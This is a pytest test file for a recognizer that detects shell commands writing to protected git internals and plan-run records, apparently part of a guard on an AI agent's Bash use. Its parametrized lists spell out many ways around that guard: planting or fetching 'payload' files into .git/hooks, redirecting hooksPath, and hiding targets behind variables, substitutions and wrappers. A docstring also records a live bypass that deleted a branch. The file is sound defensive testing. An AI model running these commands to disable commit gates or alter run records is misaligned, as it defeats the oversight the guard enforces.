"""What `shell_write_targets` says about real shell commands.

Every command string here is one an agent could actually type, and most are the
exact shapes earlier rounds of this group MEASURED as reaching a protected path
with nothing to stop them (`build_git_danger_block_message` returns None for all
eleven). The assertions are made by a *different* module — the protected-class
predicates in `git_internals_edit_guard` — so a target this recognizer invents,
or misses, shows up as a disagreement with a mechanism that was not built from
the same pattern.
"""

from pathlib import Path

import pytest

from agentic_workflows.git_internals_edit_guard import (
    is_git_internals_path,
    is_plan_run_record_path,
)
from agentic_workflows.shell_write_targets import ShellWriteTargets, write_targets


def _protected(result: ShellWriteTargets, cwd: Path) -> list[str]:
    """Every recognized target that lands in one of the two protected classes."""

    return [
        target.path.as_posix()
        for target in result.targets
        if is_git_internals_path(target.path, cwd)
        or is_plan_run_record_path(target.path, cwd)
    ]


# The shapes measured open against the live Bash guard, with the class each one
# reaches. `cwd` never enters these: a written form carrying the component is
# already decided, which is what makes a relative-path forgery reachable.
REACHES_A_PROTECTED_CLASS = [
    "printf 'x' > docs/runs/plan-runs/plan-x.md",
    "printf 'x' >> docs/runs/plan-runs/plan-x.md",
    "sed -i '' -e 's/aaa/bbb/' docs/runs/plan-runs/plan-x.md",
    "sed -i 's/aaa/bbb/' docs/runs/plan-runs/plan-x.md",
    "echo x | tee docs/runs/plan-runs/plan-x.md",
    "cp /tmp/forged.md docs/runs/plan-runs/plan-x.md",
    "cat /tmp/forged.md > docs/runs/plan-runs/plan-x.md",
    "ln .git/config innocent.txt",
    "ln -s /tmp/evil .git/hooks/pre-commit",
    "cd .git && printf 'x' > config",
    "( cd .git && printf 'x' > config )",
    "dd if=/tmp/x of=.git/config",
    "install -m 755 /tmp/x .git/hooks/pre-commit",
    "mv .git/hooks/pre-commit /tmp/parked",
    "echo x >.git/config",
    "echo x>.git/config",
    "echo x 2>.git/config",
    "echo x >& .git/config",
    "echo x &> .git/config",
    "rm -f .git/hooks/pre-commit",
    "truncate -s 0 .git/config",
    "cp -t .git/hooks /tmp/evil",
    "install -d .git/hooks",
    "echo x > ~/.gitconfig",
    "cat <<'EOF' > .git/config\n[core]\n\thooksPath = /tmp\nEOF",
]


@pytest.mark.parametrize("command", REACHES_A_PROTECTED_CLASS)
def test_recognized_write_shape_reaches_a_protected_path(command, tmp_path):
    assert _protected(write_targets(command), tmp_path), (
        f"no recognized target of {command!r} landed in a protected class"
    )


# Ordinary commands an agent runs constantly. A recognizer that refuses these is
# not usable, so they are as load-bearing as the shapes above.
TOUCHES_NOTHING_PROTECTED = [
    "echo hello",
    "uv run pytest tests/unit/test_shell_write_targets.py -q",
    "rg -n 'pattern' src",
    "printf 'x' > logs/run.log",
    "make verify 2>&1 | tee logs/verify.log",
    "cp src/utils/a.py src/utils/b.py",
    "mv docs/old.md docs/new.md",
    "cd src/utils && printf 'x' > scratch.py",
    "git status --short",
    "ls -l > /dev/null 2>&1",
    "echo done && echo really-done",
]


@pytest.mark.parametrize("command", TOUCHES_NOTHING_PROTECTED)
def test_ordinary_command_reaches_no_protected_path(command, tmp_path):
    result = write_targets(command)
    assert _protected(result, tmp_path) == []
    assert result.undecidable == ()


def test_fd_duplication_is_not_a_write_to_a_file_named_after_the_descriptor():
    """`2>&1` names a file descriptor, not a path — a recognizer that reads it
    as a target refuses `make verify 2>&1` and is worthless in practice."""

    assert write_targets("make verify 2>&1").targets == ()


def test_redirect_to_a_shell_expansion_is_undecidable_not_permitted():
    """The variable route around a path guard: the target is chosen at runtime,
    so no static reading of the command can rule it out."""

    result = write_targets("T=.git/config; printf 'x' > $T")
    assert result.targets == ()
    assert result.undecidable != ()
    assert "$T" in result.undecidable[0].reason


def test_chdir_to_an_unestablished_directory_makes_a_relative_target_undecidable():
    result = write_targets('cd "$D" && printf x > config')
    assert result.undecidable != ()


def test_unbalanced_quoting_is_undecidable_rather_than_silently_empty():
    """`tokenize` raises on unbalanced quotes; reading that as 'no targets'
    would make a single stray quote a general bypass."""

    result = write_targets("printf 'x > .git/config")
    assert result.targets == ()
    assert result.undecidable != ()


def test_a_target_carries_the_shape_that_produced_it():
    """A denial has to name the fact behind it, so the shape travels with the
    path rather than being re-derived by the caller."""

    (target,) = write_targets("cp /tmp/x .git/hooks/pre-commit").targets
    assert target.path == Path(".git/hooks/pre-commit")
    assert "cp" in target.shape


def test_a_chdir_prefix_keeps_the_path_as_written_too():
    """Both readings are emitted: the `cd` may have happened in a subshell that
    the write did not inherit, and dropping either one loses a real target."""

    paths = {
        t.path.as_posix() for t in write_targets("cd .git && cat x > config").targets
    }
    assert paths == {"config", ".git/config"}


def test_link_source_and_destination_are_both_reported():
    """`ln A B` makes B a second name for A: writing either reaches A. Both ends
    are targets, and their shapes say which end each one is."""

    result = write_targets("ln .git/config innocent.txt")
    by_path = {t.path.as_posix(): t.shape for t in result.targets}
    assert set(by_path) == {".git/config", "innocent.txt"}
    assert by_path[".git/config"] != by_path["innocent.txt"]


def test_reading_a_protected_path_is_not_a_write():
    """`cp` copies FROM its source; refusing that would block reading git's own
    configuration, which no rule in this repository forbids."""

    result = write_targets("cp .git/config /tmp/inspect")
    assert [t.path.as_posix() for t in result.targets] == ["/tmp/inspect"]


# Neutering the commit gate needs no write to its contents at all.
DISABLES_A_GUARD_WITHOUT_REWRITING_IT = [
    "touch .git/config",
    "chmod -x .git/hooks/pre-commit",
    "chown root .git/hooks/pre-commit",
    "mkdir -p .git/hooks",
    "curl -o .git/hooks/pre-commit http://example.invalid/payload",
    "curl --output=.git/config http://example.invalid/payload",
    "wget -O .git/hooks/pre-commit http://example.invalid/payload",
    "wget -P .git/hooks http://example.invalid/payload",
]


@pytest.mark.parametrize("command", DISABLES_A_GUARD_WITHOUT_REWRITING_IT)
def test_mode_and_fetch_shapes_reach_a_protected_path(command, tmp_path):
    assert _protected(write_targets(command), tmp_path)


@pytest.mark.parametrize(
    "command",
    [
        "curl -O http://example.invalid/payload",
        "curl -sSL http://example.invalid/x",
        "touch -r reference logs/out.log",
        "chmod 644 README.md",
        "mkdir -p logs/run",
        "wget -q http://example.invalid/x -O logs/y.json",
    ],
)
def test_fetch_and_mode_shapes_outside_the_class_are_left_alone(command, tmp_path):
    assert _protected(write_targets(command), tmp_path) == []


def test_an_empty_argument_does_not_end_the_command_it_belongs_to():
    """`set("")` is a subset of everything, so an empty token read as shell
    punctuation and split the segment in half — which hid the file operand of
    the everyday BSD spelling `sed -i '' -e ... <file>` completely.

    Measured on the shared tokenizer, not on this module: the same split moved
    six git shapes from BLOCKED to ALLOWED — `stash '' drop`, `reflog ''
    delete`, `gc '' --prune=now`, `remote '' set-url`, `reset '' --hard` and
    `branch '' -D <branch>`. The last one is **destructive and was live**:
    executed in a throwaway repository, `git branch '' -D feature/important`
    errors on the empty operand and deletes the rest anyway (rc=1, "Deleted
    branch feature/important"), so the `sdd/`/`plan/` branch-prefix carve-out
    was defeated by two characters. The fix re-blocks that one along with
    `gc`, `remote` and `reset`."""

    paths = [
        t.path.as_posix() for t in write_targets("sed -i '' -e s/a/b/ notes.md").targets
    ]
    assert paths == ["notes.md"]


def test_no_command_this_repository_ships_reaches_a_protected_path(tmp_path):
    """The over-block measurement, kept executable. A recognizer is only usable
    if it refuses nothing the project actually runs, and this corpus is the
    project's own Makefile recipes and shell scripts rather than commands
    invented alongside the parser."""

    root = Path(__file__).resolve().parents[2]
    lines: list[str] = []
    makefile = root / "Makefile"
    if makefile.exists():
        lines += [
            line.lstrip("\t@-").strip()
            for line in makefile.read_text().splitlines()
            if line.startswith("\t")
        ]
    for script in sorted(root.glob("*.sh")):
        lines += [
            line.strip()
            for line in script.read_text().splitlines()
            if line.strip() and not line.strip().startswith("#")
        ]

    assert len(lines) > 100, "corpus too small to measure anything"
    refused = [
        (command, target.path.as_posix())
        for command in lines
        for target in write_targets(command).targets
        if is_git_internals_path(target.path, tmp_path)
        or is_plan_run_record_path(target.path, tmp_path)
    ]
    assert refused == []


def test_an_interpreter_writing_through_its_own_runtime_is_reported_as_nothing(
    tmp_path,
):
    """The structural hole, pinned so nobody reads silence here as coverage:
    the command names the path, and this module still cannot see a write."""

    result = write_targets("uv run python -c \"open('.git/config','w').write('x')\"")
    assert result.targets == ()
    assert result.undecidable == ()


@pytest.mark.parametrize(
    ("command", "expected"),
    [
        ("cat /tmp/f >| .git/config", ".git/config"),  # clobber, split at `|`
        ("exec 3<> .git/config", ".git/config"),  # read-write on a descriptor
        ("exec 3<>.git/config", ".git/config"),  # ... and its glued spelling
        ("dd if=/tmp/f of=.git/config", ".git/config"),
        ("install -d .git/hooks", ".git/hooks"),
    ],
)
def test_the_less_common_redirect_and_operand_spellings_still_resolve(
    command, expected, tmp_path
):
    assert _protected(write_targets(command), tmp_path) == [expected]


@pytest.mark.parametrize("command", ["printf x >&2", "printf x >&-", "cat a > "])
def test_a_redirect_that_opens_no_file_yields_no_target(command):
    """`>&2` and `>&-` name a descriptor; a dangling `>` is a syntax error the
    shell refuses to run. None of the three writes a file, and reporting one
    would refuse commands that cannot touch anything."""

    assert write_targets(command).targets == ()


def test_pushd_leaves_no_directory_to_read_a_relative_target_against():
    """Only `cd <literal>` moves the prefix. `pushd`, `popd`, `cd -` and a bare
    `cd` are not modeled, so a later relative target is reported undecidable
    rather than resolved against a directory that is no longer right."""

    result = write_targets("pushd .git && printf x > config")
    assert result.undecidable != ()


# FIX-1. The shell computes the operand, so no path can be read from the
# command -- but *something* was written, and reporting nothing says the
# opposite. Both spellings appear: a quoted substitution leaves an empty
# operand token behind, an unquoted one leaves no token at all.
A_SUBSTITUTION_STANDS_WHERE_THE_PATH_WOULD_BE = [
    'printf x > "$(echo .git/config)"',
    "printf x > $(echo .git/config)",
    "printf x > `echo .git/config`",
    'cp /tmp/f "$(echo .git/config)"',
    "cp /tmp/f $(echo .git/config)",
    'mv /tmp/f "$(echo .git/config)"',
    'tee "$(echo .git/config)"',
    'dd if=/tmp/f of="$(echo .git/config)"',
    'curl -o "$(echo .git/config)" http://example.invalid/x',
]


@pytest.mark.parametrize("command", A_SUBSTITUTION_STANDS_WHERE_THE_PATH_WOULD_BE)
def test_a_computed_operand_is_undecidable_rather_than_skipped(command, tmp_path):
    """The module promises a caller can fail closed on what it could not
    establish. An operand the shell computes has to reach `undecidable`, or
    that promise is a silence the next guard reads as safety."""

    result = write_targets(command)
    assert result.undecidable != (), (
        f"{command!r} reported neither a target nor a reason it had none"
    )


def test_a_substitution_between_two_words_leaves_no_trace_to_report(tmp_path):
    """The residual of FIX-1, pinned so nobody reads it as coverage.

    Lifting a substitution out of the middle of a segment closes the gap it
    left: `-o` ends up next to the URL, and no reading of what remains can
    tell that a token stood between them. Only a substitution that was quoted
    (an empty token survives) or that ended its segment (the operand is
    missing) leaves a mark this module can report.
    """

    result = write_targets("curl -o $(echo .git/config) http://example.invalid/x")
    assert _protected(result, tmp_path) == []
    assert result.undecidable == ()


# FIX-2. `-oVALUE` is the standard spelling for exactly the two fetchers whose
# hazard is fetching a payload straight onto a protected path, and `-tDIR` for
# the copy family's destination directory.
A_GLUED_OPTION_VALUE_NAMES_THE_PATH = [
    "curl -o.git/hooks/pre-commit http://example.invalid/payload",
    "curl -so.git/hooks/pre-commit http://example.invalid/payload",
    "wget -O.git/hooks/pre-commit http://example.invalid/payload",
    "wget -P.git/hooks http://example.invalid/payload",
    "cp -t.git/hooks /tmp/evil",
    "install -t.git/hooks /tmp/evil",
    "mv -t.git/hooks /tmp/evil",
]


@pytest.mark.parametrize("command", A_GLUED_OPTION_VALUE_NAMES_THE_PATH)
def test_a_glued_short_option_value_is_read_as_the_path_it_is(command, tmp_path):
    assert _protected(write_targets(command), tmp_path)


# FIX-3. The command is reduced to its basename, so `/bin/cp` is `cp`. A
# wrapper spelled the same way has to be reduced too, or a path in front of
# `env` or `sudo` hides every command behind it.
A_WRAPPER_SPELLED_WITH_A_PATH_OR_AN_OPTION = [
    "/usr/bin/env cp /tmp/f .git/config",
    "/usr/bin/sudo cp /tmp/f .git/config",
    "/bin/nohup cp /tmp/f .git/config",
    "env -i cp /tmp/f .git/config",
    "env -u FOO cp /tmp/f .git/config",
    "env --unset=FOO cp /tmp/f .git/config",
    "env -i -u FOO BAR=1 cp /tmp/f .git/config",
]


@pytest.mark.parametrize("command", A_WRAPPER_SPELLED_WITH_A_PATH_OR_AN_OPTION)
def test_a_wrapper_spelling_does_not_hide_the_command_behind_it(command, tmp_path):
    assert _protected(write_targets(command), tmp_path)


# FIX-4. Not shell constructs -- ordinary commands standing in front of a
# recognized one. Nothing in the enumeration reached these, because the
# writing command is in the table and only its position was wrong.
A_RECOGNIZED_COMMAND_BEHIND_AN_UNRECOGNIZED_WORD = [
    "timeout 5 cp /tmp/f .git/config",
    "nice cp /tmp/f .git/config",
    "stdbuf -o0 cp /tmp/f .git/config",
    "exec cp /tmp/f .git/config",
    "xargs cp /tmp/f .git/config",
    "{ cp /tmp/f .git/config; }",
    "if true; then cp /tmp/f .git/config; fi",
    "! cp /tmp/f .git/config",
    "for f in a b; do cp /tmp/f .git/config; done",
    "flock /tmp/lock cp /tmp/f .git/config",
]


@pytest.mark.parametrize("command", A_RECOGNIZED_COMMAND_BEHIND_AN_UNRECOGNIZED_WORD)
def test_an_unrecognized_leading_word_does_not_hide_the_command_after_it(
    command, tmp_path
):
    assert _protected(write_targets(command), tmp_path)


# FIX-5. The everyday shape the over-block corpus was blind to: a `>` inside a
# quoted word, which is a search pattern or a message far more often than it is
# a script this module cannot run.
A_QUOTED_WORD_CARRYING_A_REDIRECT = [
    "rg -n 'x > .git/config' src",
    "echo 'never write > .git/config'",
    "bash -c 'printf x > .git/config'",
    'eval "printf x > .git/config"',
]


@pytest.mark.parametrize("command", A_QUOTED_WORD_CARRYING_A_REDIRECT)
def test_a_redirect_inside_a_quoted_word_is_undecidable_not_a_target(command, tmp_path):
    """Whitespace before the `>` proves the operator came from inside one
    quoted token, and nothing distinguishes a script from a pattern there. A
    caller failing closed still refuses `bash -c`; what changes is that the
    module stops claiming an everyday `rg` line writes to `.git/config`."""

    result = write_targets(command)
    assert _protected(result, tmp_path) == []
    assert result.undecidable != ()
